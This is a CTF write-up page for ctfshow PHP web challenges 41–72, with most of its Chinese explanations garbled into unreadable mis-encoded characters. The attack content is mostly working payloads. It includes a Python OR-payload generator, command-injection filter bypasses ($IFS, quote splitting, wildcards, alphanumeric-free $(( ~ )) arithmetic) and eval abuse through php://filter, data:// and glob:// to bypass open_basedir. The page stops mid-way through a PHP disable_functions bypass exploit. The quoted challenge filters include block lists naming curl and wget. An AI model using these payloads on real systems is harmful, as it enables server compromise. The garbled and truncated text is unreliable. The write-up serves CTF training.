os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your functionÔºö"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your commandÔºö"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>param<span class="token punctuation">)</span></code></pre><p><img src="web41.png" loading="lazy"></p><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>Payload:</p><blockquote><p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p><p>‰ΩøÁî® ‚Äú ; ‚Äú ‚Äú || ‚Äú ‚Äú &amp; ‚Äú ‚Äú &amp;&amp; ‚Äú ÂàÜÈöî</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1 ÊÑèÊÄùÊòØÂ∞ÜÊ†áÂáÜËæìÂá∫ÂíåÊ†áÂáÜÈîôËØØÈÉΩÈáçÂÆöÂêëÂà∞ &#x2F;dev&#x2F;null Âç≥‰∏çÂõûÊòæ<br>; ÂàÜÂè∑<br>| Âè™ÊâßË°åÂêéÈù¢ÈÇ£Êù°ÂëΩ‰ª§<br>|| Âè™ÊâßË°åÂâçÈù¢ÈÇ£Êù°ÂëΩ‰ª§<br>&amp; ‰∏§Êù°ÂëΩ‰ª§ÈÉΩ‰ºöÊâßË°å<br>&amp;&amp; ‰∏§Êù°ÂëΩ‰ª§ÈÉΩ‰ºöÊâßË°å</p></blockquote><h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>Â§öËøáÊª§‰∫Ücat,\ÂíåÔºõÔºå‰ΩøÁî®ÂÖ∂‰ªñPayloadÂç≥ÂèØ</p><h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>Â§öËøáÊª§‰∫ÜflagÔºå‰ΩøÁî®fla*Âç≥ÂèØ</p><h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>ËøáÊª§‰∫ÜÁ©∫Ê†ºÔºå‰ΩøÁî®$IFSÊàñËÄÖ%09ÁªïËøáÂç≥ÂèØ</p><h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>ËøáÊª§‰∫Ü$Âíå*ÔºåPayloadÂ¶Ç‰∏ãÔºö</p><blockquote><p>1„ÄÅ?c&#x3D;nl&lt;fla‚Äô‚Äôg.php||</p><p>2„ÄÅ?c&#x3D;ca\t&lt;fl\ag.php||</p></blockquote><h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><blockquote><p>tac%09fl‚Äô‚Äôag.php||</p><p>‚Ä¶‚Ä¶.</p></blockquote><h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>Â§öËøáÊª§‰∫Ü‰∏Ä‰∫õÂáΩÊï∞Ôºå‰∏çËøá‰πãÂâçPayloadÂèØ‰ª•ÁªßÁª≠Êâì</p><h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>ËøáÊª§‰∫Ü%Ôºå‰ΩÜÊòØÂèØ‰ª•&lt;</p><h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>Âêå‰∏ä</p><h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>ban‰∫Ütac‰ΩÜÊòØÂèØ‰ª•Áî®nl</p><h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>ban‰∫Ü&lt;&gt;Ôºå‰ΩÜÊòØÂèØ‰ª•Áî®$IFS,ËÄå‰∏îËøôÊ¨°flagÊîæÂú®‰∫ÜÊ†πÁõÆÂΩï</p><p>Payload:</p><blockquote><p>?c&#x3D;nl$IFS&#x2F;fl‚Äô‚Äôag||</p></blockquote><h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1„ÄÅ?c&#x3D;ta‚Äô‚Äôc${IFS}f‚Äô‚Äôlag.php</p><p>2„ÄÅs‚Äô‚Äôort${IFS}f???????%0a</p></blockquote><h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1„ÄÅ?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p><p>2„ÄÅmv flag.php t.txt</p></blockquote><h4 id="web55-Êó†Êï∞Â≠óÂ≠óÊØçÁöÑÂëΩ‰ª§ÊâßË°å"><a href="#web55-Êó†Êï∞Â≠óÂ≠óÊØçÁöÑÂëΩ‰ª§ÊâßË°å" class="headerlink" title="web55(Êó†Êï∞Â≠óÂ≠óÊØçÁöÑÂëΩ‰ª§ÊâßË°å)"></a>web55(Êó†Êï∞Â≠óÂ≠óÊØçÁöÑÂëΩ‰ª§ÊâßË°å)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>ËøáÊª§‰∫ÜÊâÄÊúâÂ≠óÊØç</p><p><img src="web55.png" loading="lazy"></p><p>Âà©Áî®post‰∏ä‰º†Êñá‰ª∂ÔºåÁÑ∂Âêé‰ΩøÁî®.(source)ÊâßË°åÔºå‰∏ÄËà¨‰∏ä‰º†ÂêéÊñá‰ª∂Âú®&#x2F;tmp&#x2F;php?????[@-[]</p><p><img src="web55_2.png" loading="lazy"></p><p>[ÂèÇËÄÉÊñáÁ´†]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>‚ÄúÊó†Â≠óÊØçÊï∞Â≠óÁöÑÂëΩ‰ª§ÊâßË°å‚Äù</p><h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>ÊñπÊ≥ïÂêå‰∏ä</p><h4 id="web57-ÂèñÂèç"><a href="#web57-ÂèñÂèç" class="headerlink" title="web57(ÂèñÂèç)"></a>web57(ÂèñÂèç)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//flag in 36.php </span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>ËøáÊª§‰∫ÜÂ≠óÊØçÊï∞Â≠ó</p><p>ÈÄöËøá<code>$(())</code>Êìç‰ΩúÊûÑÈÄ†Âá∫36Ôºö <code>$(())</code> Ôºö‰ª£Ë°®ÂÅö‰∏ÄÊ¨°ËøêÁÆóÔºåÂõ†‰∏∫ÈáåÈù¢‰∏∫Á©∫Ôºå‰πüË°®Á§∫ÂÄº‰∏∫0</p><p><code>$(( ~$(()) )) </code>ÔºöÂØπ0‰ΩúÂèñÂèçËøêÁÆóÔºåÂÄº‰∏∫-1</p><p><code>$(( $((~$(()))) $((~$(()))) ))</code>Ôºö -1-1Ôºå‰πüÂ∞±ÊòØ(-1)+(-1)‰∏∫-2ÔºåÊâÄ‰ª•ÂÄº‰∏∫-2</p><p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>ÔºöÂÜçÂØπ-2ÂÅö‰∏ÄÊ¨°ÂèñÂèçÂæóÂà∞1ÔºåÊâÄ‰ª•ÂÄº‰∏∫1</p><p>ÊïÖÊàë‰ª¨Âú®<code>$(( ~$(( )) ))</code>ÈáåÈù¢Êîæ37‰∏™<code>$((~$(())))</code>ÔºåÂæóÂà∞-37ÔºåÂèñÂèçÂç≥ÂèØÂæóÂà∞36</p><p>Payload:</p><blockquote><p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p></blockquote><h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1„ÄÅc&#x3D;show_source(‚Äòflag.php‚Äô);</p><p>2„ÄÅc&#x3D;highlight_file(‚Äúflag.php‚Äù);</p><p>3„ÄÅc&#x3D;include($_POST[‚Äòw‚Äô]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>4„ÄÅc&#x3D;include(‚Äúflag.php‚Äù);var_dump(get_defined_vars());</p></blockquote><h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>PayloadÂêå‰∏ä</p><h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>PayloadÂêå‰∏ä</p><h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>PayloadÂêå‰∏ä</p><h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>PayloadÂêå‰∏äÔºå‰∏çËøában‰∫Ühighlight_fileÂáΩÊï∞</p><h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>PayloadÂêå‰∏ä</p><h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>PayloadÂêå‰∏ä</p><h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>ban‰∫Üshow_source,ÁÑ∂Âêé‰ΩøÁî®php‰º™ÂçèËÆÆËØªÂèñflag.phpÊó∂ÔºåÊ∫êÁ†ÅÊòæÁ§∫flag‰∏çÂú®ËøôÔºå‰∫éÊòØ‰ΩøÁî®dataÂçèËÆÆËØªÂèñÊ†πÁõÆÂΩïÁúãÂà∞flag.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="web65.png" loading="lazy"></p><p>Âõ†‰∏∫Â§ßÈÉ®ÂàÜÁõ¥Êé•ÂèØ‰ª•ÂëΩ‰ª§ÊâßË°åÁöÑÂáΩÊï∞Ë¢´ban‰∫ÜÔºåÁúã‰∫ÜwpÊ≤°ÊÉ≥Âà∞highlight_fileÊ≤°Ë¢´ban</p><h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>PayloadÂêå‰∏ä</p><h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_fileË¢´ban‰∫ÜÔºå‰ΩÜÊòØÂèØ‰ª•Áõ¥Êé•Áî®php‰º™ÂçèËÆÆËØªÂèñ</p><h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>PayloadÂêå‰∏ä</p><p>implodeÔºöÊääÊï∞ÁªÑÂÖÉÁ¥†ÁªÑÂêà‰∏∫Â≠óÁ¨¶‰∏≤</p><p>ÂÜ∑Èó®ÂáΩÊï∞ÔºöËØªÂèñÂáΩÊï∞readgzfileÔºöÂèØ‰ª•ËØªÂèñÈùûgzÊ†ºÂºèÁöÑÊñá‰ª∂</p><p>PayloadÔºö</p><blockquote><p>1„ÄÅ?c&#x3D;echo(implode(‚Äò‚Äî‚Äò,scandir(‚Äú&#x2F;‚Äú)));</p><p>2„ÄÅ?c&#x3D;readgzfile(‚Äò&#x2F;flag.txt‚Äô);</p></blockquote><h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>ËôΩÁÑ∂ÊúâÂá†‰∏™Êä•Èîô‰ΩÜÊòØflagËøòÊòØÂá∫Êù•‰∫Ü</p><h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ËôΩÁÑ∂php‰º™ÂçèËÆÆÂèØ‰ª•ËØªÔºå‰ΩÜÊòØÁªìÊûúÊääÊï∞Â≠óÂ≠óÊØçÊõøÊç¢‰∫ÜÔºå‰ΩÜÊòØÂèØ‰ª•ÊâßË°åphp‰ª£Á†ÅËÆ©ÂêéÈù¢ÁöÑÂåπÈÖçÁºìÂÜ≤Âå∫‰∏çÊâßË°åÁõ¥Êé•ÈÄÄÂá∫exitÊàñdie</p><p>Payload:</p><blockquote><p>c&#x3D;readgzfile(‚Äò&#x2F;flag.txt‚Äô);exit(0);</p><p>c&#x3D;include(‚Äò&#x2F;flag.txt‚Äô);exit(0);</p></blockquote><h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>PayloadÂêå‰∏ä</p><h4 id="web72-globÂçèËÆÆ-wafÁªïËøá"><a href="#web72-globÂçèËÆÆ-wafÁªïËøá" class="headerlink" title="web72(globÂçèËÆÆ+wafÁªïËøá)"></a>web72(globÂçèËÆÆ+wafÁªïËøá)</h4><p>flag‰∏çÂú®&#x2F;‰∏ã‰∫ÜÔºå‰ΩÜÊòØÂæàÂ§öÊü•ËØ¢ÁöÑÂáΩÊï∞Ë¢´ban‰∫Ü</p><p>‰ΩøÁî®glob:&#x2F;&#x2F;‰º™ÂçèËÆÆÁªïËøáopen_basedir</p><p>globÂèØ‰ª•ÈÅçÂéÜÁõÆÂΩïÔºåÂπ∂‰∏î‰∏çÂèódisable_functionsÁöÑÈôêÂà∂„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php">c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob://./*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>‰ªîÁªÜÁúãÁúãËøô‰∏™‰ª£Á†Å</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># Âà©Áî®DirectoryIterator($path)ÂèØ‰ª•ÂÆûÁé∞ÈÅçÂéÜÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂</span><span class="token comment"># glob:// ‚Äî Êü•ÊâæÂåπÈÖçÁöÑÊñá‰ª∂Ë∑ØÂæÑÊ®°Âºè</span><span class="token comment"># DirectoryIterator("glob:///*")   ÈÅçÂéÜÊ†πÁõÆÂΩïÈáåÊâÄÊúâÊñá‰ª∂</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>  <span class="token comment">#Âæ™ÁéØÈÅçÂéÜËæìÂá∫ÔºåÂπ∂‰ª•Á©∫Ê†º‰∏∫ÂàÜÈöî</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ÂÖ∂ÂÆû‰∏çÂä†ÂâçÈù¢<code>?&gt;&lt;?php</code>‰πüÊòØÂèØ‰ª•ÁöÑ„ÄÇevalÈáåÁöÑËØ≠Âè•ÂèØ‰ª•ËßÜ‰∏∫Âú®ÂΩìÂâçphpÊñá‰ª∂ÈáåÂä†‰∫ÜÂá†Êù°ËØ≠Âè•ÔºåËøô‰∫õËØ≠Âè•ÂøÖÈ°ªÊòØÂÆåÊï¥ÁöÑÔºåÂç≥ÂøÖÈ°ª‰ª•<code>;</code>ÊàñËÄÖ<code>?&gt;</code>ÁªìÂ∞æÊù•ÁªìÊùüËØ≠Âè•Ôºå‰ΩÜÊòØevalÈáåÁöÑ?&gt;‰∏ç‰ºöÈó≠ÂêàÂΩìÂâçÁöÑphpÊñá‰ª∂ÔºåÊâÄ‰ª•ÂΩìÂâçphpÈ°µÈù¢ÂêéÁª≠ÁöÑËØ≠Âè•ÈÉΩÊòØ‰ºöÊâßË°åÁöÑ„ÄÇ</p><p>ÂèØ‰ª•Áúã‰∏Ä‰∏ã‰∏ãÈù¢ÁöÑÂõæÁâáÔºåevalÈáåÁöÑËØ≠Âè•ÂèØ‰ª•‰øÆÊîπÊñá‰ª∂ÁöÑÂèòÈáèÂÄºÔºå‰ΩÜÊòØ<code>?&gt;</code>Âπ∂‰∏ç‰ºöÈó≠ÂêàÂ§ñÈù¢ÁöÑPHPËØ≠Âè•„ÄÇ<br><img src="web72.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>         <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token 